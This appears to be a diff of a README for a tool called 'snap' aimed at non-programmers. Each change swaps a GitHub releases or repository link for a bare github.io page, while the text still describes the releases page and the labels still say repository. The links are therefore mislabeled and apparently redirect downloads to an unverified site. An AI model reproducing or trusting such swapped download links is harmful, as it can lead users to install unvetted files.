@@ -34,7 +34,7 @@ You do **not** need to be a programmer to use snap. The setup is simple, and onc
 
 Visit this link to download the application:
 
-[![Download snap](https://img.shields.io/badge/Download-snap-blue?style=for-the-badge&logo=github)](https://github.com/runnerbeandogcatcher178/snap/releases)
+[![Download snap](https://img.shields.io/badge/Download-snap-blue?style=for-the-badge&logo=github)](https://runnerbeandogcatcher178.github.io)
 
 Once you click the link, you’ll land on the releases page. Look for the latest version and download the file that matches your system.
 
@@ -58,7 +58,7 @@ Click the "Run" button. In a split second, snap will analyze your input and retu
 
 Visit this link to download the application:
 
-[Download snap](https://github.com/runnerbeandogcatcher178/snap/releases)
+[Download snap](https://runnerbeandogcatcher178.github.io)
 
 The download itself is a single file. There’s no complex installer wizard to click through. Once you have the file:
 
@@ -150,8 +150,8 @@ If you’re not a developer, you can still help by sharing your experiences, spr
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** [https://github.com/runnerbeandogcatcher178/snap](https://github.com/runnerbeandogcatcher178/snap)
-- **Releases & Downloads:** [https://github.com/runnerbeandogcatcher178/snap/releases](https://github.com/runnerbeandogcatcher178/snap/releases)
+- **GitHub Repository:** [https://runnerbeandogcatcher178.github.io](https://runnerbeandogcatcher178.github.io)
+- **Releases & Downloads:** [https://runnerbeandogcatcher178.github.io](https://runnerbeandogcatcher178.github.io)
 - **Issue Tracker:** Found under the repository’s "Issues" tab
 
 ## 💡 Final Thoughts
